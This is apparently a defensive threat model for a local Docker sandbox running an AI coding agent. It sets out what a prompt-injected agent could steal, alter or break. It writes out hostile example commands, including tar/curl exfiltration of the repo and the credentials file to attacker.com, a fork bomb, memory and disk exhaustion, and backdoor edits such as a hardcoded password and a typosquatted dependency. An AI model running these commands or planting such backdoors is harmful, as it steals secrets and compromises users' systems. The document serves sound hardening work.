# Blast radius

Worst-case impact assessment for the coding-sandbox, assuming it runs on a developer's local machine (laptop or workstation) and prompt injection succeeds. Each scenario describes exactly what gets stolen, changed, or broken.

---

## What the attacker has access to

Once prompt injection fires, the hijacked agent can use these resources with no user confirmation:

| Resource | Access | Location |
|----------|--------|----------|
| Repo source code | Read + write | `/home/node/repo` (mounted from host) |
| Claude OAuth token | Read | `/home/node/.claude/.credentials.json` (copied by entrypoint) |
| Claude config files | Read | `/home/node/.claude/config.json`, `settings.json`, `/home/node/.claude.json` |
| Outbound network | Unrestricted | Default bridge network, full internet + LAN access |
| Container filesystem | Read + write | No `--read-only` flag; writable everywhere |
| Host CPU / memory / disk | Unlimited | No cgroup limits set |

What the attacker **cannot** access (protected by the sandbox):

| Resource | Why it's protected |
|----------|-------------------|
| `~/.ssh/` (SSH keys) | Not mounted |
| `~/.aws/`, `~/.config/gcloud` (cloud CLI creds) | Not mounted |
| `~/.gnupg/` (GPG keys) | Not mounted |
| `~/.gitconfig`, `~/.netrc` (git credentials) | Not mounted |
| Browser profiles, cookies, saved passwords | Not mounted |
| Other repos on disk | Not mounted |
| Keychain / credential manager | Not mounted, not accessible from container |
| `/etc/`, `/usr/`, system files | Not mounted; container has its own root filesystem |

---

## Scenario 1: Source code theft

**Vectors: 1 (prompt injection) + 3 (source code exfiltration)**

**What gets stolen:**
- Every file in the mounted repo: source code, tests, configs, documentation
- Any secrets checked into the repo: `.env` files, hardcoded API keys, database passwords, private certificates, service account JSON files
- Git history if the `.git` directory is present (it is — the full repo is mounted), including deleted files that still exist in old commits

**How it happens:**
```
tar cz /home/node/repo | curl -X POST --data-binary @- https://attacker.com/drop
```
Or file-by-file via `curl`, `wget`, DNS exfiltration, or any other method. The agent has `git`, `curl`, `node`, and a full Debian userland available.

**Concrete impact:**
- If the repo is proprietary: your source code is now in the attacker's hands. Competitive advantage, trade secrets, proprietary algorithms — gone.
- If the repo contains `.env` files or hardcoded credentials: the attacker has those API keys, database connection strings, and third-party service tokens. These work from anywhere and give the attacker direct access to those services.
- If the repo contains customer data (seeds, fixtures, test databases): that data is exfiltrated too.

---

## Scenario 2: Claude API credential theft

**Vectors: 1 (prompt injection) + 2 (credential exfiltration)**

**What gets stolen:**
- The file `/home/node/.claude/.credentials.json`, which contains an OAuth token for the Anthropic API.

**How it happens:**
```
curl -X POST -d @/home/node/.claude/.credentials.json https://attacker.com/drop
```

**Concrete impact:**
- The attacker can make Claude API calls on your account. This burns your credits or runs up your bill.
- The attacker can use your Claude account to process their own workloads (summarization, code generation, etc.) at your expense.
- Depending on the token's scope, the attacker may be able to read your conversation history or account details.
- The token is **not** useful for accessing your machine, GitHub, or any other service. It is only an Anthropic API credential.

**What limits the damage:** Rotating or revoking the token (log out and re-authenticate) immediately invalidates it. The exposure window is from exfiltration until you rotate.

---

## Scenario 3: Backdoor injected into the codebase

**Vectors: 1 (prompt injection) + 4 (repo tampering), optionally + 6 (supply chain)**

**What gets changed:**

The attacker modifies files in the repo. These changes persist on the host after the container exits because the repo is mounted read-write. Concrete examples of what the attacker writes:

- **Auth bypass:** Change `if (password === hash)` to `if (password === hash || password === "4f9a2b...")` — a hardcoded backdoor password that gives the attacker access to your application.
- **Data exfiltration hook:** Add a line in your API handler that POSTs request bodies (containing user data) to an external URL, wrapped in a condition so it only runs in production.
- **Malicious dependency:** Add `"event-stream-2": "^1.0.0"` to `package.json` — a typosquatted package whose postinstall script reads environment variables and sends them to the attacker's server. This executes on every `npm install`, including in CI.
- **CI config modification:** Change `.github/workflows/deploy.yml` to add a step that curls secrets (`${{ secrets.AWS_ACCESS_KEY }}`) to an external URL during the build.
- **Weakened crypto:** Change `crypto.randomBytes(32)` to `crypto.randomBytes(4)` — makes tokens guessable but looks like a minor edit in a diff.

**Concrete impact:**
- If you commit and push without reviewing every line of the diff: the backdoor is now in your main branch, deployed to production, and the attacker has persistent access to your running application.
- If the repo is a published npm/PyPI package: every downstream consumer installs the backdoor. This is a supply-chain attack.
- If CI secrets are exfiltrated via a modified workflow: the attacker gets your deployment credentials (AWS keys, Docker Hub tokens, signing keys) — these give access far beyond the repo.

**What limits the damage:** Every change is visible in `git diff`. Running `git diff` and reading it carefully before committing catches these. Running `git checkout . && git clean -fd` reverts everything.

---

## Scenario 4: LAN device access

**Vectors: 1 (prompt injection) + 5 (internal network)**

**What gets accessed:**

The container can reach your home or office network. Typical targets on a developer's local network:

- **Home router** (usually `192.168.1.1` or `192.168.0.1`): Many routers have default credentials or no auth on the admin panel. The attacker can change DNS settings (redirect all your traffic through their server), open ports, disable firewall rules, or read connected device lists.
- **NAS devices** (Synology, QNAP, etc.): If accessible without auth or with default credentials, the attacker can read/download/delete your files — documents, photos, backups.
- **Other machines on the network:** The agent can port-scan your LAN (`nmap` is installable, or raw sockets via `node`) and attempt to access any service: SMB shares, SSH with default keys, web UIs for smart home hubs, Plex servers, etc.
- **Development services:** Local databases (Postgres on 5432, Redis on 6379, MongoDB on 27017), other Docker containers, local Kubernetes clusters — often running without authentication on localhost or LAN.
- **Host services via Docker gateway:** The container can reach the host's `172.17.0.1` (default Docker gateway). Any service listening on the host's `localhost` (dev servers, databases, admin tools) is reachable from inside the container.

**Concrete impact:**
- Router DNS hijacking: all devices on your network have their traffic silently redirected. Enables phishing, credential harvesting, and man-in-the-middle attacks on every device in your household.
- NAS data theft or destruction: personal documents, photos, backups exfiltrated or deleted.
- Local database access: if your dev database has real or realistic data, it's exfiltrated.
- Smart home compromise: depending on your setup, lights, locks, cameras, thermostats could be controlled.

**What limits the damage:** If your LAN services require authentication and don't use default credentials, most of these attacks fail. But many local development services run without auth.

---

## Scenario 5: Host crash via resource exhaustion

**Vectors: 1 (prompt injection) + 8 (resource exhaustion)**

**What happens to the host:**

The `docker run` command sets no resource limits. The agent can:

- **Fork bomb** (`:(){ :|:& };:`): Spawns processes exponentially until the kernel can't schedule anything. Your laptop freezes. Requires a hard reboot (hold power button).
- **Memory exhaustion** (`node -e "let a=[]; while(true) a.push(Buffer.alloc(1e8))"`): Consumes all RAM. The OOM killer starts killing processes — your browser, IDE, Docker daemon, anything. Unsaved work in other applications is lost.
- **Disk fill** (`dd if=/dev/zero of=/home/node/repo/junk bs=1M count=100000`): Writes directly to your host filesystem via the repo mount. If your disk fills completely: OS becomes unstable, other applications crash, databases corrupt.

**Concrete impact:**
- You lose unsaved work in all applications.
- Your machine is unusable until rebooted.
- If disk fills completely via the repo mount: potential filesystem corruption affecting the host OS. Recovery may require booting from external media.
- Annoyance and lost time, but no data exfiltration or persistent compromise.

---

## Scenario 6: Container escape to full host access

**Vectors: 1 (prompt injection) + 7 (Docker escape)**

**Probability: low** — requires an unpatched kernel or Docker runtime vulnerability. The container runs as unprivileged `node` user, doesn't use `--privileged`, and doesn't mount the Docker socket.

**If it happens, what gets accessed:**

Everything on your machine, as if the attacker were sitting at your keyboard:

- `~/.ssh/id_rsa`, `~/.ssh/id_ed25519` — your SSH private keys. Gives access to every server, GitHub org, and cloud instance you can SSH into.
- `~/.aws/credentials`, `~/.config/gcloud/` — your cloud CLI credentials. Full access to your AWS/GCP/Azure accounts.
- `~/.gnupg/` — your GPG keys. Can sign commits as you, decrypt your encrypted files.
- `~/Documents`, `~/Desktop`, `~/Downloads` — personal files.
- Browser profile directories — saved passwords, cookies, session tokens for every website you're logged into (Gmail, GitHub, bank, etc.).
- All other repos on your machine.
- Keychain access (macOS Keychain, GNOME Keyring) — potentially all stored passwords.

**Concrete impact:**
This is equivalent to someone stealing your laptop unlocked. The attacker has your identity, your credentials, your files, and access to every service you use.

---

## The realistic worst case (no container escape)

The most likely damaging attack chains scenarios 1, 2, and 3 in a single agent session:

1. A malicious comment in a repo file triggers **prompt injection**
2. The agent `tar`s the repo and `curl`s it to the attacker's server — **source code and embedded secrets are stolen**
3. The agent `cat`s `~/.claude/.credentials.json` and exfiltrates it — **Claude API token is stolen**
4. The agent modifies an auth check to add a backdoor password and adds a typosquatted npm dependency — **repo is backdoored**
5. The agent probes `192.168.1.1` and `172.17.0.1` for open services — **LAN and host services are scanned and potentially accessed**

All steps complete in seconds with no user interaction.

**What the attacker walks away with:**
- A copy of your source code and any secrets in it
- Your Claude API token (useful until rotated)
- A backdoor in your repo (effective if you commit without reviewing the diff)
- Whatever they found on your LAN (router access, NAS files, local databases)

**What they don't get:**
- Your SSH keys, cloud credentials, GPG keys, browser passwords, or any file outside the mounted repo
- Persistent access to your machine (everything is contained to the Docker session, the repo mount, and the network)

---

## Risk priority for hardening

Address in order of impact-to-effort ratio:

1. **Add resource limits** — Add `--memory=4g --pids-limit=256 --cpus=2` to the `docker run` command in `claude-yolo`. Prevents host crashes. Zero downside.
2. **Block LAN access** — Add `--network` with a custom Docker network that has no route to the host or LAN, or add iptables rules to block RFC 1918 ranges. Prevents router/NAS/local service attacks.
3. **Read-only container filesystem** — Add `--read-only --tmpfs /tmp:size=1g` to `docker run`. Limits what malicious install scripts can write. May require also adding `--tmpfs /home/node/.npm` for npm to work.
4. **Egress proxy** — Run a filtering proxy that allowlists outbound traffic to npm, GitHub, and Anthropic API domains only. Prevents source code and credential exfiltration. High effort but closes the biggest remaining gaps.
5. **Harden the container** — Add `--cap-drop=ALL --security-opt=no-new-privileges`. Reduces container escape surface. No functional impact.
